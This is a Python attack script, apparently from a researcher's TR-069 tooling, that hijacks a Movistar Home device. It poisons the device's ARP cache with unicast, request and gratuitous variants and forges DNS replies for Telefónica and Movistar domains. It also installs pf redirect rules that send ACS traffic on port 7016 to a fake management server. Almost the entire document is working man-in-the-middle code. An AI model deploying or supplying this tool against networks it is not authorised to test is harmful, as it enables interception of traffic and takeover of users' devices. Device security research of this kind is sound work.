# SANITIZED for publication. Part of the off-kernel TR-069/Troya tooling.
# Host addresses, key filenames and credentials were replaced with placeholders.
# Use only on a device you own / are authorised to test.
#!/usr/bin/env python3
"""
ARP + DNS MITM for Movistar Home (RG3205W) TR-069 hijack. RUN AS ROOT.

What it does:
1. Tells the device (<device>) that the router (<gateway>) is at OUR Mac.
2. Enables IP forwarding so all other device traffic flows through normally.
3. Intercepts the device's DNS queries:
   - *.telefonica.net / *.movistar.* etc  -> answered with our Mac IP (fake ACS)
   - everything else                     -> left untouched, normal resolution
4. Logs every query + every step to mitm.log (tail -f it from another terminal)

Cleanup: press Ctrl-C, or send SIGTERM -> restores the correct ARP entry.
If killed -9, the device self-heals when its ARP cache expires (or on reboot).

Run:
  sudo ./venv/bin/python arp_dns_spoof.py [target_ip] [gateway_ip] [iface]
"""
import atexit
import socket
import subprocess
import sys
import threading
import time
import datetime

from scapy.all import ARP, IP, UDP, Ether, conf, sendp, srp1, AsyncSniffer
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.l2 import get_if_hwaddr, get_if_addr

TARGET = sys.argv[1] if len(sys.argv) > 1 else "<device>"
GW = sys.argv[2] if len(sys.argv) > 2 else "<gateway>"
IFACE = sys.argv[3] if len(sys.argv) > 3 else "en0"
LOG_FILE = "mitm.log"
HIJACK_SUFFIXES = [
    "telefonica.net", "telefonica.com", "telefonica.es", "telefonica.de",
    "movistar.com", "movistar.es", "movistar.net", "rima-tde.net",
    "telecable.es", "o2online.de", "movistar-home.com",
]
# hardcoded ACS endpoints found in the AskeyTR69 APK (HttpDns fallback + current DNS)
ACS_IPS = ["<acs-ip-1>", "<acs-ip-2>"]
ACS_PORT = 7016
SPOOF_IP = None  # our LAN IP, answered for hijacked domains

stop = threading.Event()
target_mac = None
gw_mac = None
LOCK = threading.Lock()
seen_flows = set()


def log(msg):
    line = time.strftime("[%H:%M:%S] ") + msg
    with LOCK:
        print(line, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")


def should_hijack(name):
    q = name.lower().rstrip(".")
    return any(q == s or q.endswith("." + s) for s in HIJACK_SUFFIXES)


def resolve(ip):
    """Resolve a LAN MAC with an ARP request."""
    try:
        ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                   timeout=3, verbose=0, iface=IFACE)
        if ans and ans.haslayer(ARP):
            return ans[ARP].hwsrc
    except Exception as e:
        log(f"resolve({ip}) failed: {e}")
    return None


def poison():
    """Keep telling the device: 'the router is at MY MAC'.
    Three variants, because different stacks accept different things:
    1. unicast ARP reply      (classic)
    2. broadcast gratuitous   (AP-wide announcement)
    3. unicast ARP *request*  (targets cache the sender info on request receipt)
    """
    me = get_if_hwaddr(IFACE)
    reply = (Ether(src=me, dst=target_mac) /
             ARP(op="is-at", psrc=GW, pdst=TARGET,
                 hwsrc=me, hwdst=target_mac))
    grat = (Ether(src=me, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op="is-at", psrc=GW, pdst=GW,
                hwsrc=me, hwdst="ff:ff:ff:ff:ff:ff"))
    req = (Ether(src=me, dst=target_mac) /
           ARP(op=1, psrc=GW, pdst=TARGET,
               hwsrc=me, hwdst="00:00:00:00:00:00"))
    n = 0
    while not stop.is_set():
        sendp(reply, verbose=0, iface=IFACE)
        sendp(req, verbose=0, iface=IFACE)
        if n % 4 == 0:  # gratuitous broadcast every 4th round
            sendp(grat, verbose=0, iface=IFACE)
        n += 1
        time.sleep(1.5)


def restore():
    """Tell the device the router's real MAC again."""
    global gw_mac
    if not gw_mac:
        gw_mac = resolve(GW)
    if gw_mac:
        me = get_if_hwaddr(IFACE)
        if target_mac:
            for _ in range(6):
                sendp(Ether(src=gw_mac, dst=target_mac) /
                      ARP(op="is-at", psrc=GW, pdst=TARGET,
                          hwsrc=gw_mac, hwdst=target_mac),
                      verbose=0, iface=IFACE)
                time.sleep(0.4)
        log("ARP restored (gateway -> %s)" % gw_mac)


def on_packet(pkt):
    global gw_mac
    if target_mac is None:
        return
    me = get_if_hwaddr(IFACE)
    # device asking who has the gateway? answer before the router does
    if pkt.haslayer(ARP) and pkt[ARP].op == 1 and pkt[ARP].pdst == GW:
        if gw_mac is None:
            gw_mac = pkt[ARP].hwsrc
        sendp(Ether(src=me, dst=pkt[ARP].hwsrc) /
              ARP(op="is-at", psrc=GW, pdst=pkt[ARP].pdst,
                  hwsrc=me, hwdst=pkt[ARP].hwsrc),
              verbose=0, iface=IFACE)
        log(f"defended ARP: told {pkt[ARP].pdst} that {GW} is us")
        return
    # fallback: log any other packet involving the device (once per flow)
    if pkt.haslayer(IP) and (pkt[IP].src == TARGET or pkt[IP].dst == TARGET):
        key = None
        if pkt.haslayer(UDP):
            key = ("UDP", pkt[IP].src, pkt[IP].dst, pkt[UDP].sport, pkt[UDP].dport)
        elif pkt.haslayer(1):
            key = ("IP", pkt[IP].src, pkt[IP].dst, pkt[IP].proto)
        if key and key not in seen_flows:
            seen_flows.add(key)
            log(f"CAPTURE OK: {key}")
    # DNS from the device
    if not pkt.haslayer(DNS) or not pkt.haslayer(IP):
        return
    if pkt[IP].src != TARGET or not pkt.haslayer(UDP) or pkt[UDP].dport != 53:
        return
    dns = pkt[DNS]
    if dns.qr != 0 or not pkt.haslayer(DNSQR):
        return
    qname = pkt[DNSQR].qname.decode(errors="replace").rstrip(".")
    qtype = pkt[DNSQR].qtype
    type_name = {1: "A", 28: "AAAA", 12: "PTR", 16: "TXT", 33: "SRV"}.get(qtype, str(qtype))
    resolver = pkt[IP].dst
    if should_hijack(qname):
        log(f"*** HIJACKING {qname} ({type_name}) -> {SPOOF_IP} (was asking {resolver})")
        if qtype == 1:  # A
            resp = (IP(src=resolver, dst=TARGET) /
                    UDP(sport=53, dport=pkt[UDP].sport) /
                    DNS(id=dns.id, qr=1, aa=1, qd=pkt[DNSQR],
                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=SPOOF_IP)))
        else:  # AAAA etc: empty NOERROR so it falls back to IPv4
            resp = (IP(src=resolver, dst=TARGET) /
                    UDP(sport=53, dport=pkt[UDP].sport) /
                    DNS(id=dns.id, qr=1, aa=1, qd=pkt[DNSQR]))
        sendp(Ether(src=me, dst=target_mac) / resp, verbose=0, iface=IFACE)
    else:
        log(f"DNS passthrough: {qname} ({type_name}) via {resolver}")


def setup_pf():
    """Redirect device->hardcoded-ACS-IP traffic into our fake ACS."""
    conf = "/tmp/pf-movistar.conf"
    with open(conf, "w") as f:
        f.write("rdr pass on " + IFACE + " proto tcp from " + TARGET + " to any port 7016 -> " + SPOOF_IP + " port 7016\n")
        for ip in ACS_IPS:
            f.write("rdr pass on " + IFACE + " proto tcp from " + TARGET + " to " + ip + " port 7016 -> " + SPOOF_IP + " port 7016\n")
    subprocess.call(["pfctl", "-f", conf])
    subprocess.call(["pfctl", "-E"])
    log("pf enabled: device traffic to ACS:7016 redirects to our fake ACS")


def teardown_pf():
    subprocess.call(["pfctl", "-d"])
    log("pf disabled")


def main():
    global SPOOF_IP, target_mac
    SPOOF_IP = get_if_addr(IFACE)

    if subprocess.call(["sysctl", "-w", "net.inet.ip.forwarding=1"],
                       stdout=subprocess.DEVNULL) != 0:
        log("ERROR: could not enable IP forwarding (are you root?)")
        sys.exit(1)

    try:
        setup_pf()
    except Exception as e:
        log(f"pf setup failed: {e}")

    target_mac = resolve(TARGET)
    if not target_mac:
        log(f"ERROR: could not resolve {TARGET}'s MAC — is it on/awake?")
        sys.exit(1)
    gw_mac = resolve(GW)
    log("=" * 60)
    log(f"MITM starting | iface={IFACE} mac={get_if_hwaddr(IFACE)} ip={SPOOF_IP}")
    log(f"target={TARGET} ({target_mac}) gateway={GW} ({gw_mac})")
    log(f"hijacking: {HIJACK_SUFFIXES}  (logging to {LOG_FILE})")
    log(f"pf: ACS IPs {ACS_IPS}:{ACS_PORT} -> {SPOOF_IP}:{ACS_PORT}")
    log("=" * 60)

    atexit.register(restore)
    atexit.register(teardown_pf)

    t = threading.Thread(target=poison, daemon=True)
    t.start()

    sniffer = AsyncSniffer(iface=IFACE, filter=f"arp or host {TARGET}",
                           prn=on_packet, store=False)
    sniffer.start()
    log("Poisoning + sniffer running. Ctrl-C to stop (restores ARP).")
    log("Waiting for the first packet from the device...")
    try:
        while True:
            time.sleep(1)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        stop.set()
        sniffer.stop()
        log("Stopped. ARP restored on exit.")


if __name__ == "__main__":
    main()
